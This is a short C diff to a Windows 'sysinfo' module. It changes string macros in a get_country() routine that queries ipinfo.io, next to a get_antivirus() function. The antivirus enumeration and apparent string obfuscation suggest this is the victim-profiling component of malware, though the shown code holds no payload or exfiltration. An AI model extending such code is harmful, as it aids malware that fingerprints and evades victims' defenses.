@@ -1,4 +1,5 @@
 #include "sysinfo.h"
+#include "utils.h"
 #include <windows.h>
 #include <winhttp.h>
 #include <stdio.h>
@@ -71,14 +72,14 @@ static char* get_antivirus() {
 }
 
 static char* get_country() {
-    HINTERNET hSession = WinHttpOpen(_S("client/1.0"),
+    HINTERNET hSession = WinHttpOpen(_W("client/1.0"),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return _strdup(_S("??"));
-    HINTERNET hConnect = WinHttpConnect(hSession, _S("ipinfo.io"), INTERNET_DEFAULT_HTTP_PORT, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, _W("ipinfo.io"), INTERNET_DEFAULT_HTTP_PORT, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return _strdup(_S("??")); }
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, _S("GET"), _S("/country"), NULL,
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, _W("GET"), _W("/country"), NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return _strdup("??"); }
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return _strdup(_S("??")); }
 
     if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
